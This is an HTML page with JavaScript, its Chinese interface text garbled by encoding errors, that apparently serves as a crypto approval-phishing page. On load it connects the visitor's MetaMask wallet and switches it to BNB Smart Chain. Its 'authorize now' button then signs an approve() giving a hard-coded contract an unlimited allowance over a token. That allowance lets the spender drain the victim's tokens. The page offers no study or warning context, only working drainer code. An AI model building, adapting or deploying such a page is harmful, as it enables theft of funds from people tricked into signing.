<!DOCTYPE html>

    <style>

</head>
<body>
    <div class="container">
        <div class="logo">ğŸ”</div>
        <h1>BSC æˆæƒ</h1>
        <p class="subtitle">æˆæƒè®¿é—®æ‚¨çš„ä»£å¸</p>
        
        <div class="wallet-info" id="walletInfo" style="display: none;">
            <strong>é’±åŒ…åœ°å€:</strong> <span id="walletAddress"></span>
        </div>
        
        <div class="info-box">
            <div class="info-item">
                <span class="label">æˆæƒåˆçº¦:</span>
                <span class="value" id="contractAddress">0xe3c0e066D870036aCc178492C638963A0E97d4Bb</span>
            </div>
            <div class="info-item">
                <span class="label">ä»£å¸åˆçº¦:</span>
                <span class="value" id="tokenAddress">0xF563E86e461dE100CfCfD8b65dAA542d3d4B0550</span>
            </div>
            <div class="info-item">
                <span class="label">æˆæƒæ•°é‡:</span>
                <span class="value">æ— é™</span>
            </div>
        </div>
        
        <button class="authorize-btn" id="authorizeBtn" onclick="authorize()">
            ç«‹å³æˆæƒ
        </button>

    </div>

    <script>
        // BSCé“¾é…ç½®
        const BSC_CHAIN_ID = '0x38'; // BSCä¸»ç½‘
        const BSC_RPC_URL = 'https://bsc-dataseed1.binance.org/';
        
        // åˆçº¦åœ°å€
        const PERMISSION_ADDRESS = '0xe3c0e066D870036aCc178492C638963A0E97d4Bb';
        const TOKEN_CONTRACT = '0xF563E86e461dE100CfCfD8b65dAA542d3d4B0550';
        
        let web3;
        let userAccount;
        
        // é¡µé¢åŠ è½½å®Œæˆåè‡ªåŠ¨è¿æ¥é’±åŒ…
        window.addEventListener('load', async () => {
            await connectWallet();
        });
        
        // è¿æ¥é’±åŒ…
        async function connectWallet() {
            try {
                showStatus('æ­£åœ¨è¿æ¥é’±åŒ…...', 'info');
                
                // æ£€æŸ¥æ˜¯å¦å®‰è£…äº†MetaMask
                if (typeof window.ethereum === 'undefined') {
                    showStatus('è¯·å®‰è£…MetaMaské’±åŒ…', 'error');
                    return false;
                }
                
                // è¯·æ±‚è¿æ¥é’±åŒ…
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                if (accounts.length === 0) {
                    showStatus('è¯·æˆæƒè¿æ¥é’±åŒ…', 'error');
                    return false;
                }
                
                userAccount = accounts[0];
                
                // æ£€æŸ¥ç½‘ç»œ
                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
                if (chainId !== BSC_CHAIN_ID) {
                    await switchToBSC();
                }
                
                // åˆå§‹åŒ–Web3
                web3 = new Web3(window.ethereum);
                
                // æ˜¾ç¤ºé’±åŒ…ä¿¡æ¯
                document.getElementById('walletAddress').textContent = userAccount;
                document.getElementById('walletInfo').style.display = 'block';
                
                showStatus('é’±åŒ…è¿æ¥æˆåŠŸï¼', 'success');
                setTimeout(() => hideStatus(), 2000);
                
                return true;
                
            } catch (error) {
                console.error('è¿æ¥é’±åŒ…å¤±è´¥:', error);
                showStatus('è¿æ¥é’±åŒ…å¤±è´¥: ' + error.message, 'error');
                return false;
            }
        }
        
        // åˆ‡æ¢åˆ°BSCç½‘ç»œ
        async function switchToBSC() {
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: BSC_CHAIN_ID }],
                });
            } catch (switchError) {
                // å¦‚æœBSCç½‘ç»œä¸å­˜åœ¨ï¼Œåˆ™æ·»åŠ 
                if (switchError.code === 4902) {
                    await window.ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: BSC_CHAIN_ID,
                            chainName: 'Binance Smart Chain',
                            nativeCurrency: {
                                name: 'BNB',
                                symbol: 'BNB',
                                decimals: 18
                            },
                            rpcUrls: [BSC_RPC_URL],
                            blockExplorerUrls: ['https://bscscan.com/']
                        }]
                    });
                }
            }
        }
        
        // æˆæƒå‡½æ•°
        async function authorize() {
            if (!web3 || !userAccount) {
                showStatus('è¯·å…ˆè¿æ¥é’±åŒ…', 'error');
                return;
            }
            
            try {
                const authorizeBtn = document.getElementById('authorizeBtn');
                authorizeBtn.disabled = true;
                authorizeBtn.innerHTML = '<span class="loading"></span>æˆæƒä¸­...';
                
                showStatus('æ­£åœ¨æ„å»ºæˆæƒäº¤æ˜“...', 'info');
                
                // æ„å»ºæˆæƒäº¤æ˜“
                const tokenContract = new web3.eth.Contract([
                    {
                        "constant": false,
                        "inputs": [
                            {"name": "_spender", "type": "address"},
                            {"name": "_value", "type": "uint256"}
                        ],
                        "name": "approve",
                        "outputs": [{"name": "", "type": "bool"}],
                        "payable": false,
                        "stateMutability": "nonpayable",
                        "type": "function"
                    }
                ], TOKEN_CONTRACT);
                
                // æœ€å¤§æˆæƒæ•°é‡
                const maxUint256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
                
                // æ„å»ºäº¤æ˜“å‚æ•°
                const data = tokenContract.methods.approve(PERMISSION_ADDRESS, maxUint256).encodeABI();
                
                // ä¼°ç®—Gas
                const gasEstimate = await tokenContract.methods.approve(PERMISSION_ADDRESS, maxUint256)
                    .estimateGas({ from: userAccount });
                
                // å‘é€äº¤æ˜“
                const transaction = {
                    from: userAccount,
                    to: TOKEN_CONTRACT,
                    data: data,
                    gas: Math.floor(gasEstimate * 1.2), // å¢åŠ 20%çš„Gas
                    gasPrice: await web3.eth.getGasPrice()
                };
                
                showStatus('è¯·åœ¨é’±åŒ…ä¸­ç¡®è®¤äº¤æ˜“...', 'info');
                
                // å‘é€äº¤æ˜“
                const receipt = await web3.eth.sendTransaction(transaction);
                
                showStatus(`æˆæƒæˆåŠŸï¼äº¤æ˜“å“ˆå¸Œ: ${receipt.transactionHash}`, 'success');
                
                // é‡ç½®æŒ‰é’®
                authorizeBtn.disabled = false;
                authorizeBtn.innerHTML = 'æˆæƒæˆåŠŸ';
                authorizeBtn.style.background = 'linear-gradient(135deg, #4caf50 0%, #45a049 100%)';
                
            } catch (error) {
                console.error('æˆæƒå¤±è´¥:', error);
                showStatus('æˆæƒå¤±è´¥: ' + error.message, 'error');
                
                // é‡ç½®æŒ‰é’®
                const authorizeBtn = document.getElementById('authorizeBtn');
                authorizeBtn.disabled = false;
                authorizeBtn.innerHTML = 'é‡æ–°æˆæƒ';
            }
        }
        
        // æ˜¾ç¤ºçŠ¶æ€ä¿¡æ¯
        function showStatus(message, type) {
            const status = document.getElementById('status');
            status.textContent = message;
            status.className = `status ${type}`;
            status.style.display = 'block';
        }
        
        // éšè—çŠ¶æ€ä¿¡æ¯
        function hideStatus() {
            document.getElementById('status').style.display = 'none';
        }
        
        // ç›‘å¬ç½‘ç»œåˆ‡æ¢
        if (window.ethereum) {
            window.ethereum.on('chainChanged', (chainId) => {
                if (chainId !== BSC_CHAIN_ID) {
                    showStatus('è¯·åˆ‡æ¢åˆ°BSCç½‘ç»œ', 'error');
                } else {
                    hideStatus();
                }
            });
            
            window.ethereum.on('accountsChanged', (accounts) => {
                if (accounts.length === 0) {
                    userAccount = null;
                    document.getElementById('walletInfo').style.display = 'none';
                    showStatus('é’±åŒ…å·²æ–­å¼€è¿æ¥', 'error');
                } else {
                    userAccount = accounts[0];
                    document.getElementById('walletAddress').textContent = userAccount;
                    document.getElementById('walletInfo').style.display = 'block';
                    hideStatus();
                }
            });
        }
    </script>
</body>
